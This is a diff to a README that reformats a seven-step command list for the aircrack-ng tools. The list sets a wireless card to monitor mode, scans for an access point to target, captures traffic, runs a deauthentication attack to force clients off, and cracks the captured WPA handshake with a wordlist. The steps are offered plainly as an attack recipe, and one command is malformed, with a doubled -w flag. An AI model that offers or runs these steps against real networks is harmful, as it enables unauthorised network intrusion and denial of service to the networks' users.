@@ -16,16 +16,39 @@
 
 ## Commands:
 
-#### 1) iwconfig
+#### 1) 
 
-#### 2) Airmon-ng check kill (Kill processes that might interfere)
+    iwconfig
 
-#### 3) airmon-ng start WIRELESS_INTERFACE (example: wlan0)
+#### 2) 
 
-#### 4) airodump-ng WIRELESS_INRERFACEmon (wlan0mon) (Monitor for traffic and search for an access point to target)
+    airmon-ng check kill 
+    
+  (Kill processes that might interfere)
 
-#### 5) airodump-ng -c CHANNEL --bssid BSSID -w CAPTURE_FILE -w WIRELESS_INTERFACEmon (wlan0mon)
+#### 3) 
 
-#### 6) aireplay-ng -0 NUM -a MAC_ADDRESS_OF_ACCESS_POINT -c STATION_NUMBER WIRELESS_INTERFACEmon (wlan0mon) (Deauth Attack, NUM means how many times will this attack be performed)
+    airmon-ng start WIRELESS_INTERFACE 
+  
+  (example: wlan0)
 
-#### 7) aircrack-ng -w WORDLIST.TXT -b BSSID CAPTURE_FILE (Crack WPA Handshake)
+#### 4) 
+
+    airodump-ng WIRELESS_INRERFACEmon 
+    
+  (wlan0mon) (Monitor for traffic and search for an access point to target)
+
+#### 5) 
+
+    airodump-ng -c CHANNEL --bssid BSSID -w CAPTURE_FILE -w WIRELESS_INTERFACEmon (wlan0mon)
+
+#### 6) 
+
+    aireplay-ng -0 NUM -a MAC_ADDRESS_OF_ACCESS_POINT -c STATION_NUMBER WIRELESS_INTERFACEmon 
+  (wlan0mon) (Deauth Attack, NUM means how many times will this attack be performed)
+
+#### 7) 
+
+    aircrack-ng -w WORDLIST.TXT -b BSSID CAPTURE_FILE 
+    
+  (Crack WPA Handshake)
